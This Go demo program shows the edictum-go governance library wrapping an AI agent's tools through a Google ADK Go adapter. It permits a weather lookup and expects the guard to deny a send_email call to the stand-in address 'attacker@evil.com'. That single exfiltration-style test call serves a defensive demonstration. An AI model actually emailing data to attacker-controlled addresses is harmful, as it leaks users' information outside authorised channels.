// demo-adkgo demonstrates edictum-go governance with the Google ADK Go adapter.
//
// Usage: go run ./demo-adkgo/
package main

import (
	"context"
	"fmt"
	"os"

	"github.com/edictum-ai/edictum-go/adapter/adkgo"

	"github.com/edictum-ai/edictum-demo/adapters/go/shared"
)

func main() {
	contractsPath := shared.ContractsPath()

	g, err := shared.CreateGuard(contractsPath, "analyst")
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error: %v\n", err)
		os.Exit(1)
	}

	shared.PrintBanner("Google ADK Go")

	// ── Show adapter integration ────────────────────────────────────
	// In a real Google ADK Go application, you would wrap your tool
	// functions with governance:
	//
	//   adapter := adkgo.New(g)
	//   wrappedGetWeather := adapter.WrapTool("get_weather",
	//       func(ctx context.Context, args map[string]any) (any, error) {
	//           return shared.GetWeather(args)
	//       },
	//   )
	//   // Register wrappedGetWeather with your ADK agent

	adapter := adkgo.New(g)

	// Demonstrate a single wrapped tool call
	fmt.Println("  Adapter demo: calling get_weather via ADK Go wrapper...")
	wrappedWeather := adapter.WrapTool("get_weather",
		func(ctx context.Context, args map[string]any) (any, error) {
			return shared.GetWeather(args)
		},
	)

	result, err := wrappedWeather(context.Background(), map[string]any{"city": "Paris"})
	if err != nil {
		fmt.Printf("  Adapter call error: %v\n", err)
	} else {
		fmt.Printf("  Adapter result: %v\n", result)
	}

	// Demonstrate a denied call through the adapter
	fmt.Println("  Adapter demo: calling send_email to evil domain (should be DENIED)...")
	wrappedEmail := adapter.WrapTool("send_email",
		func(ctx context.Context, args map[string]any) (any, error) {
			return shared.SendEmail(args)
		},
	)
	_, err = wrappedEmail(context.Background(), map[string]any{
		"to": "attacker@evil.com", "subject": "test", "body": "hi",
	})
	if err != nil {
		fmt.Printf("  Adapter correctly denied: %v\n", err)
	} else {
		fmt.Println("  WARNING: expected denial but call was allowed")
	}

	// Create a fresh guard for scenario run (adapter demo consumed session state)
	g2, err := shared.CreateGuard(contractsPath, "analyst")
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error creating scenario guard: %v\n", err)
		os.Exit(1)
	}
	fmt.Println()
	fmt.Println("  Now running full scenario suite via guard.Run()...")

	// ── Run all scenarios ───────────────────────────────────────────
	shared.RunScenarios(g2)
}
